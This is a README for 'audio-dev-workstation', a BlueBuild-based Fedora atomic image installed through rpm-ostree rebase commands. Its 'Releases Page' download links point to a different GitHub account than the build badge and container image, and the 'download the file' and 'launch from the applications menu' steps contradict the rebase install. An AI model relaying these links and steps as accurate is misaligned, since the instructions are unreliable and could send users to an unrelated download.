---
layout: "default"
title: "🎧 audio-dev-workstation - Your Complete Audio Development Environment"
description: "🔊 Create a versatile audio development workstation using this template for easy setup and customization of Fedora-based environments."
---
# 🎧 audio-dev-workstation - Your Complete Audio Development Environment

[![bluebuild build badge](https://github.com/jaydifryahtoo/audio-dev-workstation/actions/workflows/build.yml/badge.svg)](https://github.com/jaydifryahtoo/audio-dev-workstation/actions/workflows/build.yml)

Transform your computer into a powerful audio development platform.

## 🚀 Getting Started

To begin using audio-dev-workstation, follow these simple steps.

## 📥 Download & Install

Visit this page to download:  
[Releases Page](https://github.com/hasansaifulrijal/audio-dev-workstation/releases)

1. Go to the releases page linked above.
2. Find the latest version under "Latest Release."
3. Click on the file to download it to your computer.

## 📋 System Requirements

- **Operating System:** Fedora 33 or later
- **Processor:** Minimum 2 GHz dual-core
- **Memory:** At least 4 GB RAM
- **Disk Space:** 10 GB of free space

## 🔧 Installation Steps

1. **Rebase the Unsigned Image**

   Open a terminal window and run the following command to rebase your existing atomic Fedora installation:

   ```bash
   rpm-ostree rebase ostree-unverified-registry:ghcr.io/jaydifryahtoo/audio-dev-workstation:iso
   ```

2. **Reboot System**

   After rebasing, reboot your system to complete the installation:

   ```bash
   systemctl reboot
   ```

3. **Rebase to the Signed Image**

   Once the system is back online, run this command to complete the installation with the signed image:

   ```bash
   rpm-ostree rebase ghcr.io/jaydifryahtoo/audio-dev-workstation:signed
   ```

## 🎤 Features

- **Pre-configured Environment:** Includes essential audio development tools and libraries.
- **User-Friendly Interface:** Designed for simplicity, even for those new to audio development.
- **Compatibility:** Supports various audio formats and devices.

## 🛠️ How to Use

Once installed, you can launch the audio-dev-workstation from your applications menu. The workspace includes tools for audio editing, mixing, and more.

## 🌐 Documentation

For additional instructions and tips, refer to the official [BlueBuild docs](https://blue-build.org/how-to/setup/) for setting up your own repository template. Make sure to update this README based on your custom image if needed.

## 📣 Community Support

Join the conversation and seek help in our Discord server or on our GitHub Issues page. Your feedback is invaluable to improving the audio-dev-workstation.

## 🔗 Links

- [Releases Page](https://github.com/hasansaifulrijal/audio-dev-workstation/releases)
- [BlueBuild Documentation](https://blue-build.org/how-to/setup/)

## 📝 License

This project is licensed under the MIT License. Feel free to contribute and share your improvements.

## 📄 Acknowledgements

Thanks to the open-source community and contributors who make this project possible.